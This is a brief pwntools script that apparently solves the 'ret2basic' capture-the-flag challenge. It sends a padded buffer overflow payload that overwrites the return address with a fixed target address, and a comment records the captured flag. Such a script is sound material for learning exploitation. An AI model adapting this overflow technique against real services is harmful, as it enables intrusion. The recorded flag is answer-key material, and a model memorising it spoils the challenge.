#!/usr/bin/env python3
#flag{d07f3219a8715e9339f31cfbe09d6502}
#python3 solution.py

from pwn import *

target_address = 0x401215

p = remote("challenge.nahamcon.com", 30413)
#p = process("./ret2basic")
#raw_input("attach gdb")

p.recvuntil("Can you overflow this?:")

pad = b'A' * cyclic_find("faab") #cyclic(128)
payload = pad + p64(target_address)

print(payload)
p.sendline(payload)
p.interactive()

